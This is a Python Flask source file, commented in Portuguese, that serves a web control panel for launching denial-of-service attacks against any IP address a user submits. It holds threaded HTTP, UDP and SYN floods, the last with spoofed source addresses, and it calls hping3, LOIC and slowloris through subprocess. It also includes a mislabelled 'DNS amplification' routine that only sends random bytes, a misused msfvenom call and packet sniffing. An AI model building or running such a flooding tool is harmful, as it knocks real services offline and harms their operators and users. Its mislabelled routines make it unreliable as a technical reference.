from flask import Flask, request, jsonify, render_template
import threading
import socket
import random
import time
import subprocess
import requests
import pyshark
import socketio
from scapy.all import IP, TCP, UDP, send, RandShort

app = Flask(__name__)

# Variáveis globais para controlar a execução
attack_running = False

# Função de ataque HTTP (Flood) com Scapy
def attack_http(target_ip, port, duration):
    global attack_running
    end_time = time.time() + duration
    while time.time() < end_time and attack_running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, port))
            headers = [
                "GET / HTTP/1.1",
                f"Host: {target_ip}",
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Connection: keep-alive",
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "Accept-Encoding: gzip, deflate, br",
                "Accept-Language: en-US,en;q=0.9,pt-BR;q=0.8,pt;q=0.7"
            ]
            request_header = "\r\n".join(headers) + "\r\n\r\n"
            sock.send(request_header.encode())
            sock.close()
            print("[HTTP] Heavy packet sent!")
        except Exception as e:
            print(f"[HTTP] Failed to connect: {e}")

# Função de ataque UDP Flood
def attack_udp(target_ip, port, duration):
    global attack_running
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(2048)  # Pacote UDP muito maior
    while time.time() < end_time and attack_running:
        try:
            sock.sendto(packet, (target_ip, port))
            print("[UDP] Heavy UDP packet sent!")
        except Exception as e:
            print(f"[UDP] Failed to send packet: {e}")

# Função de ataque SYN Flood
def attack_syn(target_ip, port, duration):
    global attack_running
    end_time = time.time() + duration
    while time.time() < end_time and attack_running:
        try:
            ip = IP(src=random.choice(["192.168.0.1", "10.0.0.1", "172.16.0.1"]), dst=target_ip)
            tcp = TCP(dport=port, flags="S", seq=RandShort())
            packet = ip/tcp
            send(packet, verbose=False)
            print("[SYN] Heavy SYN packet sent!")
        except Exception as e:
            print(f"[SYN] Failed to send packet: {e}")

# Função de ataque DNS Amplification
def attack_dns(target_ip, duration):
    global attack_running
    end_time = time.time() + duration
    while time.time() < end_time and attack_running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            packet = random._urandom(512)
            sock.sendto(packet, (target_ip, 53))  # Porta padrão do DNS
            print("[DNS] DNS Amplification packet sent!")
        except Exception as e:
            print(f"[DNS] Failed to send DNS packet: {e}")

# Função de ataque usando Hping3 (via subprocess)
def attack_hping3(target_ip, port, duration):
    global attack_running
    end_time = time.time() + duration
    while time.time() < end_time and attack_running:
        try:
            subprocess.run(["hping3", "-S", target_ip, "-p", str(port), "--flood"])
            print("[HPING3] SYN Flood sent!")
        except Exception as e:
            print(f"[HPING3] Failed to execute: {e}")

# Função de ataque usando LOIC (via subprocess)
def attack_loic(target_ip, port, duration):
    global attack_running
    end_time = time.time() + duration
    while time.time() < end_time and attack_running:
        try:
            subprocess.run(["loic", target_ip, str(port)])
            print("[LOIC] Attack initiated!")
        except Exception as e:
            print(f"[LOIC] Failed to execute: {e}")

# Função de ataque usando Metasploit (via subprocess)
def attack_metasploit(target_ip, port, duration):
    global attack_running
    end_time = time.time() + duration
    while time.time() < end_time and attack_running:
        try:
            subprocess.run(["msfvenom", "-p", "linux/x86/shell_bind_tcp", "RHOST=" + target_ip, "RPORT=" + str(port)])
            print("[Metasploit] Attack initiated!")
        except Exception as e:
            print(f"[Metasploit] Failed to execute: {e}")

# Função de ataque usando Slowloris (via subprocess)
def attack_slowloris(target_ip, port, duration):
    global attack_running
    end_time = time.time() + duration
    while time.time() < end_time and attack_running:
        try:
            subprocess.run(["slowloris", target_ip, "-p", str(port), "--time", str(duration)])
            print("[Slowloris] Attack initiated!")
        except Exception as e:
            print(f"[Slowloris] Failed to execute: {e}")

# Função de ataque usando requests
def attack_requests(target_ip, duration):
    global attack_running
    end_time = time.time() + duration
    while time.time() < end_time and attack_running:
        try:
            response = requests.get(f"http://{target_ip}/")
            print(f"[Requests] Response status: {response.status_code}")
        except Exception as e:
            print(f"[Requests] Failed to send GET request: {e}")

# Função de ataque usando pyshark para sniffing
def attack_sniff(target_ip, duration):
    global attack_running
    end_time = time.time() + duration
    capture = pyshark.LiveCapture(interface='eth0')
    while time.time() < end_time and attack_running:
        for packet in capture.sniff_continuously(packet_count=5):
            print(f"[PyShark] Packet captured: {packet}")

# Função para iniciar o ataque com múltiplos threads
def start_attack_thread(target_ip, port, duration, threads, attack_type):
    global attack_running
    attack_running = True
    if attack_type == "http_flood":
        for _ in range(threads):
            threading.Thread(target=attack_http, args=(target_ip, port, duration)).start()
    elif attack_type == "udp_flood":
        for _ in range(threads):
            threading.Thread(target=attack_udp, args=(target_ip, port, duration)).start()
    elif attack_type == "syn_flood":
        for _ in range(threads):
            threading.Thread(target=attack_syn, args=(target_ip, port, duration)).start()
    elif attack_type == "dns_amplification":
        for _ in range(threads):
            threading.Thread(target=attack_dns, args=(target_ip, duration)).start()
    elif attack_type == "hping3":
        for _ in range(threads):
            threading.Thread(target=attack_hping3, args=(target_ip, port, duration)).start()
    elif attack_type == "loic":
        for _ in range(threads):
            threading.Thread(target=attack_loic, args=(target_ip, port, duration)).start()
    elif attack_type == "metasploit":
        for _ in range(threads):
            threading.Thread(target=attack_metasploit, args=(target_ip, port, duration)).start()
    elif attack_type == "slowloris":
        for _ in range(threads):
            threading.Thread(target=attack_slowloris, args=(target_ip, port, duration)).start()
    elif attack_type == "requests":
        for _ in range(threads):
            threading.Thread(target=attack_requests, args=(target_ip, duration)).start()
    elif attack_type == "pyshark":
        for _ in range(threads):
            threading.Thread(target=attack_sniff, args=(target_ip, duration)).start()

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/start_attack', methods=['POST'])
def start_attack():
    data = request.json
    target_ip = data.get('target_ip')
    port = int(data.get('port'))
    threads = int(data.get('threads'))
    duration = int(data.get('duration'))
    attack_type = data.get('attack_type')

    threading.Thread(target=start_attack_thread, args=(target_ip, port, duration, threads, attack_type)).start()

    return jsonify({"message": f"Attack '{attack_type}' started successfully!"})

@app.route('/stop_attack', methods=['POST'])
def stop_attack():
    global attack_running
    attack_running = False
    return jsonify({"message": "Attack stopped!"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
